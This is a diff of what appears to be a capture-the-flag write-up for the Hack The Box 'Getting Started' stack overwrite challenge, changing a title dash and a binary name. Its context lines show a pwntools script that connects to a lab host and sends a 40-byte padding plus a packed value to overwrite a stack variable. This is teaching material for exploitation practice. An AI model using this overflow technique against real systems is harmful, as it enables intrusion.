@@ -1,4 +1,4 @@
-# HTB Getting Started — Stack Overwrite
+# HTB Getting Started - Stack Overwrite
 
 A beginner-friendly intro challenge. Running the binary prints a visualization of the stack and immediately shows what needs to be done:
 
@@ -33,7 +33,7 @@ HTB provides a starter script for this challenge. The only change needed is fill
 from pwn import *
 
 p = remote('94.237.54.42', 31963)
-# p = process('./getting_started')
+# p = process('./getting-started')
 
 payload  = b'A' * 40
 payload += p32(0x1337babe)
